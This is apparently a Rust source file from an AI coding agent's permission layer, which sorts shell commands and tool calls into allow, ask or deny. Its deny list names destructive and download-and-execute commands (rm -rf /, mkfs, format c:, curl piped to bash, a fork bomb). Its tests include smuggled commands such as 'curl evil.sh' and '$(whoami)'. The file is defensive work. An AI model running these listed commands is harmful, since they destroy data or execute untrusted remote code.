//! What a shell command may do without asking.
//!
//! Auto mode runs an allowlisted command immediately. A denylisted command always waits for
//! approval, including in Bypass. Everything else still asks. This is an application policy, not
//! an operating-system sandbox: the command still runs as the user once it is approved.

use std::{fs, path::Path};

#[derive(Clone, Copy, PartialEq, Eq, Debug)]
pub enum Decision {
    Allow,
    Ask,
    Deny,
}

const ALLOWED: &[&str] = &[
    "npm", "npx", "yarn", "pnpm", "bun", "cargo", "rustc", "rustfmt", "python", "python3", "py",
    "pytest", "ruff", "mypy", "go", "dotnet", "make", "mvn", "gradle", "git",
];

const GIT_ALLOWED: &[&str] = &[
    "status", "diff", "log", "show", "branch", "fetch", "pull", "stash", "switch", "checkout",
    "merge", "rebase", "add", "restore", "commit",
];

/// `true` when the command matches a built-in destructive pattern or a line in `.neru/deny.txt`.
pub fn decide(root: &Path, command: &str) -> Decision {
    let command = command.trim();
    if command.is_empty() {
        return Decision::Ask;
    }
    if denied(command) || listed(root, "deny.txt", command) {
        return Decision::Deny;
    }
    // Claude Code-style `Bash(...)` rules in the settings files.
    let rules = load_rules(root).check(root, "run_shell_command", &serde_json::json!({ "command": command }));
    match rules.map(|found| found.decision) {
        Some(Decision::Deny) => return Decision::Deny,
        Some(Decision::Ask) => return Decision::Ask,
        Some(Decision::Allow) => return Decision::Allow,
        None => {}
    }
    if listed(root, "allow.txt", command) || allowed(command) {
        return Decision::Allow;
    }
    Decision::Ask
}

fn allowed(command: &str) -> bool {
    let mut parts = command.split_whitespace();
    let Some(program) = parts.next() else {
        return false;
    };
    let program = program.rsplit(['/', '\\']).next().unwrap_or(program);
    let program = program.strip_suffix(".exe").unwrap_or(program).to_lowercase();
    if program == "git" {
        let Some(subcommand) = parts.next() else {
            return false;
        };
        return GIT_ALLOWED.contains(&subcommand);
    }
    ALLOWED.contains(&program.as_str()) && program != "git"
}

fn denied(command: &str) -> bool {
    let compact = command.split_whitespace().collect::<Vec<_>>().join(" ").to_lowercase();
    // A download piped straight into a shell, whatever the URL: curl … | bash, irm … | iex.
    let downloads = ["curl ", "wget ", "irm ", "iwr ", "invoke-webrequest", "invoke-restmethod"].iter().any(|tool| compact.contains(tool));
    let squeezed = compact.replace(' ', "");
    let into_shell = ["|sh", "|bash", "|zsh", "|iex", "|invoke-expression", "|pwsh", "|powershell"].iter().any(|pipe| squeezed.contains(pipe));
    if downloads && into_shell {
        return true;
    }
    const NEEDLES: &[&str] = &[
        "rm -rf /",
        "rm -rf ~",
        "rm -rf /*",
        "git push --force",
        "git push -f",
        "git push --force-with-lease",
        "shutdown",
        "diskpart",
        "mkfs",
        "format c:",
        "format d:",
        "remove-item -recurse c:\\",
        "remove-item -recurse d:\\",
        "del /s /q c:\\",
        "rd /s /q c:\\",
        ":(){",
        "curl | sh",
        "curl | bash",
        "wget | sh",
        "irm | iex",
    ];
    NEEDLES.iter().any(|needle| compact.contains(needle))
}

fn listed(root: &Path, name: &str, command: &str) -> bool {
    let Ok(text) = fs::read_to_string(root.join(".neru").join(name)) else {
        return false;
    };
    let command = command.to_lowercase();
    text.lines()
        .map(str::trim)
        .filter(|line| !line.is_empty() && !line.starts_with('#'))
        .any(|line| command.contains(&line.to_lowercase()))
}

// ---------------------------------------------------------------------------------------------
// Permission rules from settings files, in Claude Code's format:
// {"permissions": {"allow": ["Bash(npm run test:*)"], "deny": ["Read(./secrets/**)"], "ask": []}}

/// A rule such as `Bash`, `Bash(git status)`, `Edit(src/**)` or `mcp__github__create_issue`.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Rule {
    pub tool: String,
    /// What is inside the parentheses; `None` for a bare tool name (or `Tool(*)`).
    pub specifier: Option<String>,
    /// The rule as written, for messages.
    pub text: String,
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum RuleKind {
    Allow,
    Ask,
    Deny,
}

/// The rules from every settings file, with where each came from.
#[derive(Clone, Debug, Default)]
pub struct Rules {
    entries: Vec<(RuleKind, Rule, String)>,
}

/// What the settings rules say about one tool call.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct RuleMatch {
    /// `Allow` skips the approval prompt, `Ask` always prompts, `Deny` refuses the call.
    pub decision: Decision,
    pub rule: String,
    /// The settings file the rule is in, e.g. `.claude/settings.json`.
    pub source: String,
}

pub fn parse_rule(text: &str) -> Option<Rule> {
    let trimmed = text.trim();
    if trimmed.is_empty() {
        return None;
    }
    let (tool, specifier) = match trimmed.find('(') {
        Some(open) if trimmed.ends_with(')') => (trimmed[..open].trim(), Some(trimmed[open + 1..trimmed.len() - 1].trim())),
        Some(_) => return None,
        None => (trimmed, None),
    };
    if tool.is_empty() || !tool.chars().all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-' || c == '*') {
        return None;
    }
    let specifier = specifier.filter(|spec| !spec.is_empty() && *spec != "*").map(String::from);
    Some(Rule { tool: tool.to_string(), specifier, text: trimmed.to_string() })
}

/// The project's own settings files, most general first. Their hooks and allow-rules only apply
/// once the project is trusted (see `crate::trust`).
pub fn project_settings_files(root: &Path) -> Vec<(String, std::path::PathBuf)> {
    [".claude/settings.json", ".claude/settings.local.json", ".neru/settings.json"].into_iter().map(|name| (name.to_string(), root.join(name))).collect()
}

/// The settings files Neru reads permission rules from, most general first: the personal
/// `~/.claude/settings.json`, then the project's own.
pub fn settings_files(root: &Path) -> Vec<(String, std::path::PathBuf)> {
    let mut files = Vec::new();
    // Tests must not depend on the settings of whoever runs them.
    #[cfg(not(test))]
    if let Some(home) = dirs::home_dir() {
        files.push(("~/.claude/settings.json".to_string(), home.join(".claude").join("settings.json")));
    }
    files.extend(project_settings_files(root));
    files
}

pub fn read_settings(path: &Path) -> Option<serde_json::Value> {
    let text = fs::read_to_string(path).ok()?;
    serde_json::from_str(text.trim_start_matches('\u{feff}')).ok()
}

/// Reads `permissions.allow|deny|ask` from `~/.claude/settings.json`, `.claude/settings.json`,
/// `.claude/settings.local.json` and `.neru/settings.json`. Allow-rules from the project's files
/// are ignored until the project is trusted; its deny and ask rules always apply.
pub fn load_rules(root: &Path) -> Rules {
    let mut rules = Rules::default();
    let mut trusted = None;
    for (label, path) in settings_files(root) {
        let Some(value) = read_settings(&path) else { continue };
        let personal = label.starts_with('~');
        let allow = personal || *trusted.get_or_insert_with(|| crate::trust::is_trusted(root));
        rules.extend_with(&value, &label, allow);
    }
    rules
}

impl Rules {
    pub(crate) fn extend_from(&mut self, settings: &serde_json::Value, source: &str) {
        self.extend_with(settings, source, true);
    }

    /// Like `extend_from`; `allow: false` drops the allow-rules (an untrusted project's).
    fn extend_with(&mut self, settings: &serde_json::Value, source: &str, allow: bool) {
        for (key, kind) in [("allow", RuleKind::Allow), ("ask", RuleKind::Ask), ("deny", RuleKind::Deny)] {
            if kind == RuleKind::Allow && !allow {
                continue;
            }
            for text in settings["permissions"][key].as_array().into_iter().flatten().filter_map(|item| item.as_str()).take(500) {
                if let Some(rule) = parse_rule(text) {
                    self.entries.push((kind, rule, source.to_string()));
                }
            }
        }
    }

    /// Deny wins over ask, and ask over allow. `None` when no rule is about this call.
    pub fn check(&self, root: &Path, tool: &str, args: &serde_json::Value) -> Option<RuleMatch> {
        if self.entries.is_empty() {
            return None;
        }
        let call = Call::new(root, tool, args);
        let found = |kind: RuleKind, all: bool| {
            self.entries
                .iter()
                .filter(|(entry, rule, _)| *entry == kind && call.names_match(rule))
                .find(|(_, rule, _)| call.matches(root, rule, all, &self.entries, kind))
        };
        let (decision, entry) = if let Some(entry) = found(RuleKind::Deny, false) {
            (Decision::Deny, entry)
        } else if let Some(entry) = found(RuleKind::Ask, false) {
            (Decision::Ask, entry)
        } else if let Some(entry) = found(RuleKind::Allow, true) {
            (Decision::Allow, entry)
        } else {
            return None;
        };
        Some(RuleMatch { decision, rule: entry.1.text.clone(), source: entry.2.clone() })
    }
}

/// What a rule is matched against.
enum Subject {
    Command(String),
    Paths(Vec<String>),
    Url(String),
    Plain,
}

struct Call<'a> {
    tool: &'a str,
    /// Claude Code's names for this tool; rules may use either those or Neru's own name.
    aliases: &'static [&'static str],
    subject: Subject,
}

impl<'a> Call<'a> {
    fn new(root: &Path, tool: &'a str, args: &serde_json::Value) -> Self {
        let text = |key: &str| args[key].as_str().unwrap_or("").to_string();
        let (aliases, subject): (&'static [&'static str], Subject) = match tool {
            "run_shell_command" => (&["Bash"], Subject::Command(text("command"))),
            "run_project_task" => (&["Bash"], crate::tasks::command(root, args["task"].as_str().unwrap_or("")).map(Subject::Command).unwrap_or(Subject::Plain)),
            "propose_edit" | "propose_write_file" | "propose_delete" | "propose_create_folder" | "propose_move" => (
                &["Edit", "Write", "MultiEdit", "NotebookEdit"],
                Subject::Paths(["path", "from", "to"].iter().map(|key| text(key)).filter(|path| !path.is_empty()).collect()),
            ),
            "read_file" | "list_directory" => (&["Read", "LS"], Subject::Paths(vec![text("path")])),
            "read_files" => (
                &["Read"],
                Subject::Paths(args["files"].as_array().into_iter().flatten().filter_map(|file| file.as_str().or_else(|| file["path"].as_str())).map(String::from).collect()),
            ),
            "search_text" => (&["Grep"], Subject::Plain),
            "find_files" | "project_map" | "find_symbol" => (&["Glob"], Subject::Plain),
            "fetch_url" => (&["WebFetch"], Subject::Url(text("url"))),
            "web_search" => (&["WebSearch"], Subject::Plain),
            "task" => (&["Task", "Agent"], Subject::Plain),
            _ => (&[], Subject::Plain),
        };
        Self { tool, aliases, subject }
    }

    fn names_match(&self, rule: &Rule) -> bool {
        if rule.tool.starts_with("mcp__") {
            if self.tool == rule.tool {
                return true;
            }
            if let Some(prefix) = rule.tool.strip_suffix('*') {
                return self.tool.starts_with(prefix);
            }
            // `mcp__server` covers every tool of that server.
            return rule.tool.matches("__").count() == 1 && self.tool.starts_with(&format!("{}__", rule.tool));
        }
        rule.tool == self.tool || self.aliases.contains(&rule.tool.as_str())
    }

    /// Whether `rule` covers this call. With `all` (allow rules) every part of the call must be
    /// covered by some allow rule; otherwise one part is enough.
    fn matches(&self, root: &Path, rule: &Rule, all: bool, entries: &[(RuleKind, Rule, String)], kind: RuleKind) -> bool {
        let Some(spec) = &rule.specifier else { return true };
        match &self.subject {
            Subject::Command(command) => {
                let parts = command_parts(command);
                if parts.is_empty() {
                    return false;
                }
                if !all {
                    return parts.iter().any(|part| command_matches(spec, part));
                }
                // Command substitution cannot be checked piece by piece; only a bare rule allows it.
                if command.contains("$(") || command.contains('`') {
                    return false;
                }
                parts.iter().any(|part| command_matches(spec, part))
                    && parts.iter().all(|part| {
                        entries.iter().any(|(entry, other, _)| *entry == kind && self.names_match(other) && other.specifier.as_deref().is_none_or(|spec| command_matches(spec, part)))
                    })
            }
            Subject::Paths(paths) => {
                if paths.is_empty() {
                    return false;
                }
                if !all {
                    return paths.iter().any(|path| path_matches(root, spec, path));
                }
                paths.iter().any(|path| path_matches(root, spec, path))
                    && paths.iter().all(|path| {
                        entries.iter().any(|(entry, other, _)| *entry == kind && self.names_match(other) && other.specifier.as_deref().is_none_or(|spec| path_matches(root, spec, path)))
                    })
            }
            Subject::Url(url) => url_matches(spec, url),
            Subject::Plain => false,
        }
    }
}

/// Splits a shell command at `&&`, `||`, `;`, `|` and newlines outside quotes.
fn command_parts(command: &str) -> Vec<String> {
    let mut parts = Vec::new();
    let mut current = String::new();
    let mut quote: Option<char> = None;
    let mut chars = command.chars().peekable();
    while let Some(c) = chars.next() {
        match quote {
            Some(q) => {
                if c == q {
                    quote = None;
                }
                current.push(c);
            }
            None => match c {
                '"' | '\'' => {
                    quote = Some(c);
                    current.push(c);
                }
                ';' | '\n' | '\r' => parts.push(std::mem::take(&mut current)),
                '&' if chars.peek() == Some(&'&') => {
                    chars.next();
                    parts.push(std::mem::take(&mut current));
                }
                '|' => {
                    if chars.peek() == Some(&'|') {
                        chars.next();
                    }
                    parts.push(std::mem::take(&mut current));
                }
                _ => current.push(c),
            },
        }
    }
    parts.push(current);
    parts.into_iter().map(|part| part.split_whitespace().collect::<Vec<_>>().join(" ")).filter(|part| !part.is_empty()).collect()
}

/// `git status` is exact; `npm run test:*` is a prefix ending at a word boundary; other `*` are
/// wildcards that match anything.
fn command_matches(spec: &str, command: &str) -> bool {
    let spec = spec.split_whitespace().collect::<Vec<_>>().join(" ");
    if let Some(prefix) = spec.strip_suffix(":*") {
        let prefix = prefix.trim_end();
        return command == prefix || command.strip_prefix(prefix).is_some_and(|rest| rest.starts_with(' '));
    }
    if spec.contains('*') {
        return wildcard(&spec, command);
    }
    command == spec
}

/// `*` matches any run of characters, including none.
fn wildcard(pattern: &str, text: &str) -> bool {
    let parts: Vec<&str> = pattern.split('*').collect();
    let mut rest = text;
    for (index, part) in parts.iter().enumerate() {
        if index == 0 {
            let Some(after) = rest.strip_prefix(part) else { return false };
            rest = after;
        } else if index == parts.len() - 1 {
            return rest.ends_with(part);
        } else {
            let Some(at) = rest.find(part) else { return false };
            rest = &rest[at + part.len()..];
        }
    }
    rest.is_empty()
}

/// `domain:example.com` matches that host (and `*.example.com` its subdomains); anything else is
/// a wildcard over the whole URL.
fn url_matches(spec: &str, url: &str) -> bool {
    match spec.strip_prefix("domain:") {
        Some(domain) => {
            let host = reqwest::Url::parse(url.trim()).ok().and_then(|url| url.host_str().map(str::to_lowercase)).unwrap_or_default();
            let domain = domain.trim().to_lowercase();
            !host.is_empty() && (host == domain || wildcard(&domain, &host))
        }
        None => wildcard(spec, url.trim()),
    }
}

fn slashes(path: &str) -> String {
    let path = path.trim().replace('\\', "/");
    let path = path.trim_start_matches("//?/").to_string();
    if cfg!(windows) { path.to_lowercase() } else { path }
}

/// `C:/Users/x` → `/c/users/x`, the form `//c/...` patterns use on Windows.
fn absolute_form(path: &str) -> String {
    let path = slashes(path);
    let bytes = path.as_bytes();
    if bytes.len() >= 2 && bytes[1] == b':' {
        return format!("/{}{}", (bytes[0] as char).to_ascii_lowercase(), &path[2..]);
    }
    path
}

/// Gitignore-style path rules, as in Claude Code: `//abs/path`, `~/in/home`, `/from/project/root`,
/// `./relative` or `relative/path`, and a bare name (`*.env`) matches at any depth. `**` crosses
/// folders, `*` stays inside one, and a pattern that names a folder covers everything below it.
fn path_matches(root: &Path, spec: &str, path: &str) -> bool {
    let root_text = slashes(&root.display().to_string());
    let target = slashes(path);
    let target = target.trim_start_matches("./").trim_end_matches('/').to_string();
    let absolute = Path::new(path.trim()).is_absolute() || target.starts_with('/') || target.as_bytes().get(1) == Some(&b':');
    let relative = if absolute {
        target.strip_prefix(&format!("{}/", root_text.trim_end_matches('/'))).map(String::from)
    } else {
        Some(target.clone())
    };
    let absolute_target = if absolute { absolute_form(&target) } else { absolute_form(&format!("{}/{}", root_text.trim_end_matches('/'), target)) };
    let mut pattern = slashes(spec);
    if pattern.ends_with('/') {
        pattern.push_str("**");
    }
    if let Some(rest) = pattern.strip_prefix("//") {
        return glob_covers(&format!("/{rest}"), &absolute_target);
    }
    if let Some(rest) = pattern.strip_prefix("~/") {
        let Some(home) = dirs::home_dir() else { return false };
        let home = absolute_form(&home.display().to_string());
        return glob_covers(&format!("{}/{rest}", home.trim_end_matches('/')), &absolute_target);
    }
    let Some(relative) = relative else { return false };
    let pattern = pattern.trim_start_matches("./").trim_start_matches('/');
    if pattern.is_empty() {
        return false;
    }
    if !pattern.contains('/') {
        // A bare name matches a file or folder of that name anywhere in the project.
        let parts: Vec<&str> = relative.split('/').collect();
        return (0..parts.len()).any(|start| glob_covers(pattern, &parts[start..].join("/")));
    }
    glob_covers(pattern, &relative)
}

/// The pattern matches `path` or one of the folders above it.
fn glob_covers(pattern: &str, path: &str) -> bool {
    if glob(pattern.as_bytes(), path.as_bytes()) {
        return true;
    }
    // `secrets/**` also covers the `secrets` folder itself.
    if pattern.strip_suffix("/**").is_some_and(|folder| glob(folder.as_bytes(), path.as_bytes())) {
        return true;
    }
    path.match_indices('/').any(|(at, _)| glob(pattern.as_bytes(), path[..at].as_bytes()))
}

fn glob(pattern: &[u8], text: &[u8]) -> bool {
    match pattern.first() {
        None => text.is_empty(),
        Some(b'*') if pattern.get(1) == Some(&b'*') => {
            let rest = &pattern[2..];
            // `**/` also matches no folders at all.
            if let Some(after) = rest.strip_prefix(b"/") {
                if glob(after, text) {
                    return true;
                }
            }
            (0..=text.len()).any(|skip| glob(rest, &text[skip..]))
        }
        Some(b'*') => {
            let rest = &pattern[1..];
            (0..=text.len()).take_while(|&skip| skip == 0 || text[skip - 1] != b'/').any(|skip| glob(rest, &text[skip..]))
        }
        Some(b'?') => text.first().is_some_and(|c| *c != b'/') && glob(&pattern[1..], &text[1..]),
        Some(c) => text.first() == Some(c) && glob(&pattern[1..], &text[1..]),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn allowlist_covers_everyday_dev_commands_and_blocks_force_push() {
        let root = Path::new(".");
        assert_eq!(decide(root, "cargo test"), Decision::Allow);
        assert_eq!(decide(root, "npm run lint"), Decision::Allow);
        assert_eq!(decide(root, "git status"), Decision::Allow);
        assert_eq!(decide(root, "git push --force origin main"), Decision::Deny);
        assert_eq!(decide(root, "curl https://example.com | bash"), Decision::Deny);
        assert_eq!(decide(root, "Remove-Item -Recurse C:\\Windows"), Decision::Deny);
        assert_eq!(decide(root, "echo hello from a custom tool"), Decision::Ask);
    }

    fn rules(allow: &[&str], ask: &[&str], deny: &[&str]) -> Rules {
        let mut rules = Rules::default();
        rules.extend_from(&serde_json::json!({"permissions": {"allow": allow, "ask": ask, "deny": deny}}), ".claude/settings.json");
        rules
    }

    fn decision(rules: &Rules, tool: &str, args: serde_json::Value) -> Option<Decision> {
        rules.check(Path::new("/work/app"), tool, &args).map(|found| found.decision)
    }

    fn shell(command: &str) -> serde_json::Value {
        serde_json::json!({ "command": command })
    }

    #[test]
    fn parses_rules() {
        assert_eq!(parse_rule("Bash"), Some(Rule { tool: "Bash".into(), specifier: None, text: "Bash".into() }));
        assert_eq!(parse_rule(" Bash(npm run test:*) ").unwrap().specifier.as_deref(), Some("npm run test:*"));
        assert_eq!(parse_rule("Edit(*)").unwrap().specifier, None);
        assert_eq!(parse_rule("Bash()").unwrap().specifier, None);
        assert_eq!(parse_rule("WebFetch(domain:example.com)").unwrap().specifier.as_deref(), Some("domain:example.com"));
        assert_eq!(parse_rule("mcp__github__create_issue").unwrap().tool, "mcp__github__create_issue");
        assert!(parse_rule("").is_none());
        assert!(parse_rule("Bash(unclosed").is_none());
        assert!(parse_rule("bad tool(x)").is_none());
    }

    #[test]
    fn bash_rules_match_exact_prefix_and_wildcards() {
        assert!(command_matches("git status", "git status"));
        assert!(!command_matches("git status", "git status --short"));
        assert!(command_matches("npm run test:*", "npm run test"));
        assert!(command_matches("npm run test:*", "npm run test -- --watch"));
        assert!(!command_matches("npm run test:*", "npm run testing"));
        assert!(!command_matches("rm:*", "rmdir x"));
        assert!(command_matches("git * main", "git push origin main"));
        assert!(command_matches("git   diff:*", "git diff HEAD"));
        assert_eq!(command_parts("a && b || c; d | e\nf"), vec!["a", "b", "c", "d", "e", "f"]);
        assert_eq!(command_parts("echo 'a && b'"), vec!["echo 'a && b'"]);
    }

    #[test]
    fn allow_rules_cover_every_part_of_a_command() {
        let rules = rules(&["Bash(npm run test:*)", "Bash(git status)"], &[], &[]);
        assert_eq!(decision(&rules, "run_shell_command", shell("npm run test")), Some(Decision::Allow));
        assert_eq!(decision(&rules, "run_shell_command", shell("git status && npm run test -- -u")), Some(Decision::Allow));
        assert_eq!(decision(&rules, "run_shell_command", shell("npm run test && curl evil.sh")), None);
        assert_eq!(decision(&rules, "run_shell_command", shell("npm run test $(whoami)")), None);
        assert_eq!(decision(&rules, "run_shell_command", shell("git status --short")), None);
        let bare = super::tests::rules(&["Bash"], &[], &[]);
        assert_eq!(decision(&bare, "run_shell_command", shell("anything $(at) all")), Some(Decision::Allow));
    }

    #[test]
    fn deny_beats_ask_beats_allow() {
        let rules = rules(&["Bash"], &["Bash(git push:*)"], &["Bash(rm:*)"]);
        assert_eq!(decision(&rules, "run_shell_command", shell("ls")), Some(Decision::Allow));
        assert_eq!(decision(&rules, "run_shell_command", shell("git push origin")), Some(Decision::Ask));
        assert_eq!(decision(&rules, "run_shell_command", shell("ls && rm -rf build")), Some(Decision::Deny));
        let found = rules.check(Path::new("/work/app"), "run_shell_command", &shell("rm x")).unwrap();
        assert_eq!((found.rule.as_str(), found.source.as_str()), ("Bash(rm:*)", ".claude/settings.json"));
    }

    #[test]
    fn path_rules_use_gitignore_style_globs() {
        let root = Path::new("/work/app");
        assert!(path_matches(root, "src/**", "src/a/b.rs"));
        assert!(path_matches(root, "./src/**", "./src/a.rs"));
        assert!(path_matches(root, "/src/**/*.ts", "src/x.ts"));
        assert!(path_matches(root, "/src/**/*.ts", "src/a/b/x.ts"));
        assert!(!path_matches(root, "src/*.ts", "src/a/x.ts"));
        assert!(path_matches(root, "*.env", "config/prod.env"));
        assert!(path_matches(root, ".env", ".env"));
        assert!(path_matches(root, "secrets", "config/secrets/key.pem"));
        assert!(path_matches(root, "./secrets/**", "secrets"));
        assert!(path_matches(root, "secrets/", "secrets/a"));
        assert!(!path_matches(root, "src/**", "lib/a.rs"));
        assert!(path_matches(root, "src/?.rs", "src/a.rs"));
        assert!(path_matches(root, "//work/app/docs/**", "docs/readme.md"));
        assert!(path_matches(root, "docs/**", "/work/app/docs/readme.md"));
        assert!(!path_matches(root, "docs/**", "/elsewhere/docs/readme.md"));
    }

    #[test]
    fn rules_map_claude_tools_to_neru_tools() {
        let rules = rules(&["Edit(src/**)", "WebFetch(domain:docs.rs)", "mcp__github", "Read"], &["Write(package.json)"], &["Read(./secrets/**)", "mcp__notion__notion-delete"]);
        assert_eq!(decision(&rules, "propose_edit", serde_json::json!({"path": "src/main.rs"})), Some(Decision::Allow));
        assert_eq!(decision(&rules, "propose_write_file", serde_json::json!({"path": "package.json"})), Some(Decision::Ask));
        assert_eq!(decision(&rules, "propose_move", serde_json::json!({"from": "src/a.rs", "to": "lib/a.rs"})), None);
        assert_eq!(decision(&rules, "read_file", serde_json::json!({"path": "secrets/key"})), Some(Decision::Deny));
        assert_eq!(decision(&rules, "read_files", serde_json::json!({"files": [{"path": "a.rs"}, {"path": "secrets/b"}]})), Some(Decision::Deny));
        assert_eq!(decision(&rules, "read_file", serde_json::json!({"path": "src/a.rs"})), Some(Decision::Allow));
        assert_eq!(decision(&rules, "fetch_url", serde_json::json!({"url": "https://docs.rs/serde"})), Some(Decision::Allow));
        assert_eq!(decision(&rules, "fetch_url", serde_json::json!({"url": "https://evil.docs.rs.example/x"})), None);
        assert_eq!(decision(&rules, "mcp__github__create_issue", serde_json::json!({})), Some(Decision::Allow));
        assert_eq!(decision(&rules, "mcp__githubx__create_issue", serde_json::json!({})), None);
        assert_eq!(decision(&rules, "mcp__notion__notion-delete", serde_json::json!({})), Some(Decision::Deny));
        let native = super::tests::rules(&["run_shell_command(cargo check)", "mcp__notion__*"], &[], &[]);
        assert_eq!(decision(&native, "run_shell_command", shell("cargo check")), Some(Decision::Allow));
        assert_eq!(decision(&native, "mcp__notion__search", serde_json::json!({})), Some(Decision::Allow));
    }

    #[test]
    fn settings_files_feed_decide() {
        let root = std::env::temp_dir().join(format!("neru-policy-{}", uuid::Uuid::new_v4()));
        fs::create_dir_all(root.join(".claude")).unwrap();
        fs::write(root.join(".claude/settings.json"), r#"{"permissions":{"allow":["Bash(make deploy-preview)","Bash(git push --force:*)"],"deny":["Bash(npm publish:*)"]}}"#).unwrap();
        // Until the project is trusted, its allow-rules are ignored but its deny-rules apply.
        let preview = serde_json::json!({ "command": "make deploy-preview" });
        assert_eq!(load_rules(&root).check(&root, "run_shell_command", &preview), None);
        assert_eq!(decide(&root, "npm publish --tag next"), Decision::Deny);
        assert_eq!(load_rules(&root).entries.len(), 1);
        crate::trust::trust_project(&root).unwrap();
        assert_eq!(load_rules(&root).check(&root, "run_shell_command", &preview).map(|found| found.decision), Some(Decision::Allow));
        assert_eq!(decide(&root, "make deploy-preview"), Decision::Allow);
        assert_eq!(decide(&root, "npm publish --tag next"), Decision::Deny);
        // A destructive command is never allowed by a rule.
        assert_eq!(decide(&root, "git push --force origin main"), Decision::Deny);
        assert_eq!(load_rules(&root).entries.len(), 3);
        let _ = fs::remove_dir_all(root);
    }
}
